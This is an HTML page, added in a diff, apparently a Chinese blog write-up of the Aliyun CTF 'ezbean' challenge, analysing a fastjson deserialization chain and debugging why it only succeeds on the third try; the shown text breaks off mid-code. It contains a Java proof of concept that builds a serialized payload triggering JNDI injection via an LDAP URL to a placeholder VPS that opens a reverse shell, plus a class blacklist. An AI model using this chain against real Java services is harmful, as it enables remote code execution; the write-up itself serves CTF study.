@@ -1,0 +1,841 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=dark>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/apple-touch-icon.png">
+  <link rel="icon" href="/img/fav.ico">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Sloth">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="aliyun CTF ezbean分析与思考0x00 前言复现阿里云的时候发现了一个很奇怪、很玄学的点，官方和冠军wp都是一笔带过了，官方也没给exp，就试着自己硬调，调着调着有点上头，应该没人发过吧，我猜的😂 前置知识FastJson反序列化中有常见的链，BadAttributeValueExpException触发的JSON#toString-》getter方法，这个过程有点复杂，也不是本文">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[aliyun CTF] ezbean分析与思考">
+<meta property="og:url" content="http://sloth31.github.io/2023/05/05/ezbean%E5%88%86%E6%9E%90%E4%B8%8E%E6%80%9D%E8%80%83/index.html">
+<meta property="og:site_name" content="Sloth&#39;s Blog">
+<meta property="og:description" content="aliyun CTF ezbean分析与思考0x00 前言复现阿里云的时候发现了一个很奇怪、很玄学的点，官方和冠军wp都是一笔带过了，官方也没给exp，就试着自己硬调，调着调着有点上头，应该没人发过吧，我猜的😂 前置知识FastJson反序列化中有常见的链，BadAttributeValueExpException触发的JSON#toString-》getter方法，这个过程有点复杂，也不是本文">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305050236105.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305050236187.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305050236143.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305050236065.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305050237675.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305050237433.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305050237274.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305050237845.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305050237915.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305050238540.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305050238797.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305050238509.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305050247946.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305050238031.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305050238335.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305050239359.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305050239280.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305050239992.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305050239172.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305050239392.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305050239543.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305050239596.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305050239279.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305050240664.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305050240513.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305050240832.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305050240730.png">
+<meta property="article:published_time" content="2023-05-05T15:29:13.000Z">
+<meta property="article:modified_time" content="2023-12-07T15:10:01.507Z">
+<meta property="article:author" content="Sloth">
+<meta property="article:tag" content="web">
+<meta property="article:tag" content="java">
+<meta property="article:tag" content="fastjson">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305050236105.png">
+  
+  
+  
+  <title>[aliyun CTF] ezbean分析与思考 | Sloth&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/macpanel.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"sloth31.github.io","root":"/","version":"1.9.2","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"c8LjkMGtqBFlFQrpl65qUKoM-gzGzoHsz","app_key":"5MBWFG00GDY2LpteTo0bvyRu","server_url":"https://c8ljkmgt.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 6.1.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Sloth&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="[aliyun CTF] ezbean分析与思考"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-05-05 23:29" pubdate>
+          2023年5月5日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          9.2k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          52 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">[aliyun CTF] ezbean分析与思考</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="aliyun-CTF-ezbean分析与思考"><a href="#aliyun-CTF-ezbean分析与思考" class="headerlink" title="aliyun CTF ezbean分析与思考"></a>aliyun CTF ezbean分析与思考</h1><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>复现阿里云的时候发现了一个很奇怪、很玄学的点，官方和冠军wp都是一笔带过了，官方也没给exp，就试着自己硬调，调着调着有点上头，应该没人发过吧，我猜的😂</p>
+<h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><p>FastJson反序列化中有常见的链，BadAttributeValueExpException触发的JSON#toString-》getter方法，这个过程有点复杂，也不是本文的重点，具体可以参考</p>
+<p><a target="_blank" rel="noopener" href="https://y4tacker.github.io/2023/03/20/year/2023/3/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">fastjson和原生反序列化</a></p>
+<h2 id="0x01-题目背景"><a href="#0x01-题目背景" class="headerlink" title="0x01 题目背景"></a>0x01 题目背景</h2><h3 id="反序列化点"><a href="#反序列化点" class="headerlink" title="反序列化点"></a>反序列化点</h3><p>题目给出了一个可以反序列化参数data传入数据的路由read</p>
+<p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305050236105.png" srcset="/img/loading.gif" lazyload alt="image-20230504230327231"></p>
+<blockquote>
+<p>这里的<code>MyObjectInputStream</code>继承自<code>ObjectInputStream</code>,调用readObject方会先进入resolveClass具体调用栈如下</p>
+<p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305050236187.png" srcset="/img/loading.gif" lazyload alt="image-20230504233800680"></p>
+</blockquote>
+<p>跟进resolveClass</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> Class <span class="hljs-title function_">resolveClass</span><span class="hljs-params">(ObjectStreamClass cls)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>   <span class="hljs-keyword">if</span>(!contains(cls.getName())) &#123;<span class="hljs-comment">//*</span><br>      <span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>.resolveClass(cls);<br>   &#125; <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvalidClassException</span>(<span class="hljs-string">&quot;Unexpected serialized class&quot;</span>, cls.getName());<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>跟进<code>com.ctf.ezser.utils.MyObjectInputStream#contains</code>方法，是一个黑名单过滤</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> String[] blacklist = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<br>           <span class="hljs-string">&quot;java\\.security.*&quot;</span>, <span class="hljs-string">&quot;java\\.rmi.*&quot;</span>,  <span class="hljs-string">&quot;com\\.fasterxml.*&quot;</span>, <span class="hljs-string">&quot;com\\.ctf\\.*&quot;</span>,<br>           <span class="hljs-string">&quot;org\\.springframework.*&quot;</span>, <span class="hljs-string">&quot;org\\.yaml.*&quot;</span>, <span class="hljs-string">&quot;javax\\.management\\.remote.*&quot;</span><br>   &#125;;<br><span class="hljs-comment">//...  </span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">contains</span><span class="hljs-params">(String targetValue)</span> &#123;<br>      <span class="hljs-keyword">for</span> (String forbiddenPackage : blacklist) &#123;<br>         <span class="hljs-keyword">if</span> (targetValue.matches(forbiddenPackage))<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>      &#125;<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>   &#125;<br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>不过经实测这个黑名单似乎起不到过滤的作用</p>
+<p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305050236143.png" srcset="/img/loading.gif" lazyload alt="image-20230504234209559"></p>
+</blockquote>
+<h2 id="0x02-问题发现"><a href="#0x02-问题发现" class="headerlink" title="0x02 问题发现"></a>0x02 问题发现</h2><h3 id="限制分析"><a href="#限制分析" class="headerlink" title="限制分析"></a>限制分析</h3><p>fastjson&#x3D;&#x3D;1.2.60&gt;1.2.49</p>
+<p><code>SecureObjectInputStream</code>类当中重写了<code>resolveClass</code>,在其中调用了<code>checkAutoType</code>方法做类的检查</p>
+<p>这里提一下fastjson中的反序列化机制，由于ObjectInputStream的不安全性，fastjson在调用<code>JSONArray/JSONObject</code>的readObject方法触发反序列化时，会将反序列化过程委托给<code>SecureObjectInputStream</code>处理，这个类可以理解成是安全的<code>ObjectInputStream</code>，下图为委托起点(<code>ObjectInputStream#defaultReadObject</code>)</p>
+<p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305050236065.png" srcset="/img/loading.gif" lazyload alt="image-20230504235432194"></p>
+<p>之后的过程感兴趣可以调一下看下调用栈，几个节点如下（太多了，只选了其中几个）</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">ObjectInputStream #defaultReadObject<br>ObjectInputStream #ReadObject<br>ObjectInputStream #ReadObject0<br>ObjectInputStream #readNonProxyDesc<br>SecureObjectInputStream #resolveClass<br></code></pre></td></tr></table></figure>
+
+<p>关注一下resolveClass</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> Class&lt;?&gt; resolveClass(ObjectStreamClass desc)<br>        <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> desc.getName();<br>    <span class="hljs-keyword">if</span> (name.length() &gt; <span class="hljs-number">2</span>) &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">index</span> <span class="hljs-operator">=</span> name.lastIndexOf(<span class="hljs-string">&#x27;[&#x27;</span>);<br>        <span class="hljs-keyword">if</span> (index != -<span class="hljs-number">1</span>) &#123;<br>            name = name.substring(index + <span class="hljs-number">1</span>);<br>        &#125;<br>        <span class="hljs-keyword">if</span> (name.length() &gt; <span class="hljs-number">2</span> &amp;&amp; name.charAt(<span class="hljs-number">0</span>) == <span class="hljs-string">&#x27;L&#x27;</span> &amp;&amp; name.charAt(name.length() - <span class="hljs-number">1</span>) == <span class="hljs-string">&#x27;;&#x27;</span>) &#123;<br>            name = name.substring(<span class="hljs-number">1</span>, name.length() - <span class="hljs-number">1</span>);<br>        &#125;<br>        ParserConfig.global.checkAutoType(name, <span class="hljs-literal">null</span>, Feature.SupportAutoType.mask);<span class="hljs-comment">//重点，调用了checkAutoType方法</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>.resolveClass(desc);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>反序列化失败的大多数原因都是checkAutoType函数执行过程中抛出了JSONException异常</p>
+</blockquote>
+<p>这个异常大概字符串是</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">default</span> constructor not found. <span class="hljs-keyword">class</span> <span class="hljs-title class_">xxxxx</span><br></code></pre></td></tr></table></figure>
+
+<p>这样的话之前的链子就打不通了，原来有Fastjson反序列化的链子思路是从<code>BadAttributeValueExpException</code>-&gt;<code>JSON#toString</code>-&gt;<code>JSON#toJSONString</code>，进而最后能触发任意类的getter(就是类的方法名以get开头的)，回看这题给的MyBean，里面有个<code>getConnect</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> String <span class="hljs-title function_">getConnect</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>  <span class="hljs-keyword">try</span> &#123;<br>     <span class="hljs-built_in">this</span>.conn.connect();<br>     <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;success&quot;</span>;<br>  &#125; <span class="hljs-keyword">catch</span> (IOException var2) &#123;<br>     <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;fail&quot;</span>;<br>  &#125;<br>&#125;<br><span class="hljs-comment">//   private JMXConnector conn;</span><br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>只要我们能触发getConnect，将conn设置为RMIConnector，可以触发JNDI注入，之后也就能反弹shell了</p>
+</blockquote>
+<h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">jmxurl</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;service:jmx:rmi:///jndi/ldap://vps_ip:1389/Basic/ReverseShell/vps_ip/3344&quot;</span>;<br><span class="hljs-type">JMXServiceURL</span> <span class="hljs-variable">jmxServiceURL</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JMXServiceURL</span>(jmxurl);<br><span class="hljs-type">RMIConnector</span> <span class="hljs-variable">rmi</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RMIConnector</span>(jmxServiceURL, <span class="hljs-literal">null</span>);<br>com.ctf.ezser.bean.<span class="hljs-type">MyBean</span> <span class="hljs-variable">mb</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">com</span>.ctf.ezser.bean.MyBean(jmxurl,<span class="hljs-string">&quot;sssaaaa&quot;</span>,rmi);<br><br>com.alibaba.fastjson.<span class="hljs-type">JSONArray</span> <span class="hljs-variable">jsonArray</span> <span class="hljs-operator">=</span>  <span class="hljs-keyword">new</span> <span class="hljs-title class_">com</span>.alibaba.fastjson.JSONArray();<br>jsonArray.add(mb);<br><br><span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">val</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br><span class="hljs-type">Field</span> <span class="hljs-variable">valfield</span> <span class="hljs-operator">=</span> val.getClass().getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);<br>valfield.setAccessible(<span class="hljs-literal">true</span>);<br>valfield.set(val, jsonArray);<br><span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br><span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>oos.writeObject(val);<br><br><span class="hljs-type">String</span> <span class="hljs-variable">ret</span> <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(baos.toByteArray());<br>System.out.println(ret);<br></code></pre></td></tr></table></figure>
+
+<h3 id="玄学事件"><a href="#玄学事件" class="headerlink" title="玄学事件"></a>玄学事件</h3><p>按理来说，根据上述链子构造的反序列化应该会被SecureObjectInputStream拦截，进而执行<code>checkAutoType</code>然后抛出JSONException异常，导致反序列化失败，但神奇的是前两次反序列化一定失败，而从第三次开始就能成功并反弹shell。并且官方wp也用的这条链子，但写得过于简短，看冠军队的wp说是fj的随机构造函数问题，后来调了一下感觉可能不是这个原因</p>
+<p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305050237675.png" srcset="/img/loading.gif" lazyload alt="image-20230505012846237"></p>
+<p>一开始以为三次只是巧合，后来每次验证都是三次。并且第一次是<code>default constructor not found. class xxx.RMIConnector</code>第二次是<code>default constructor not found. class xxx.JMXServiceURL</code></p>
+<p>这里先提一下checkAutoType通过typeName找类的三种方式</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> (clazz == <span class="hljs-literal">null</span>) &#123;<br>    clazz = TypeUtils.getClassFromMapping(typeName);<span class="hljs-comment">//🌟</span><br>&#125;<br><br><span class="hljs-keyword">if</span> (clazz == <span class="hljs-literal">null</span>) &#123;<br>    clazz = deserializers.findClass(typeName);<br>&#125;<br><br><span class="hljs-keyword">if</span> (clazz == <span class="hljs-literal">null</span>) &#123;<br>    clazz = typeMapping.get(typeName);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>经过测试，最主要的方法是<code>TypeUtils.getClassFromMapping</code>这个方法会去TypeUtils的mappings成员里找是否有以typeName为Name的类（🌟🌟这个很重要 记一下）mappings是静态私有成员，在初始化时就放入了107个常见类（也是SecureObjectInputStream认为是安全的类）</p>
+</blockquote>
+<p>调的过程中发现三次执行的过程中，这个mappings成员的size分别是108、109、110，而在110时反序列化成功，想必大家看到这里都能发现这个关键点了，也能猜测到前两次工作是把抛出异常没找到那个类添加进mappings</p>
+<h2 id="0x03-调试分析"><a href="#0x03-调试分析" class="headerlink" title="0x03 调试分析"></a>0x03 调试分析</h2><p>理论上是说得通了，还得是调试一下来验证</p>
+<h3 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h3><p>这题里能传入checkAutoType去寻找的非原生类只有</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">com.ctf.ezser.bean.MyBean <span class="hljs-comment">//反序列化终点，被调用getConnect-》this.conn.connect();</span><br>javax.management.remote.rmi.RMIConnector <span class="hljs-comment">//传入MyBean构造函数给conn赋值</span><br>javax.management.remote.JMXServiceURL  <span class="hljs-comment">//用于传入RMIConnector构造函数</span><br></code></pre></td></tr></table></figure>
+
+
+<h3 id="异常信号寻找"><a href="#异常信号寻找" class="headerlink" title="异常信号寻找"></a>异常信号寻找</h3><p>首先先找一下这个一直报错的<code>default constructor not found. class xxx</code>字段，找出来是在<code>JavaBeanInfo#build</code>方法的某处</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java">    <span class="hljs-keyword">if</span> ((!kotlin)<br>            &amp;&amp; !clazz.getName().equals(<span class="hljs-string">&quot;javax.servlet.http.Cookie&quot;</span>)) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JavaBeanInfo</span>(clazz, builderClass, <span class="hljs-literal">null</span>, creatorConstructor, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, jsonType, fieldList);<br>    &#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;default constructor not found. &quot;</span> + clazz);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>在这题的反序列化过程中kotlin都为false，因此关注第二个条件，经调试，走到这一步的clazz都不会是<code>javax.servlet.http.Cookie</code>，而是上面三个前提条件中的后两个</p>
+</blockquote>
+<p>checkAutoType方法后续会创建一个JavaBeanInfo调用clazz方法，不过前提是前一个if没有成功的return跳出函数，从下面代码可以看出，如果三种方法都找不到class，也就不会提前退出</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//...</span><br><span class="hljs-keyword">if</span> (clazz == <span class="hljs-literal">null</span>) &#123;<br>    clazz = TypeUtils.getClassFromMapping(typeName);<br>&#125;<br><span class="hljs-keyword">if</span> 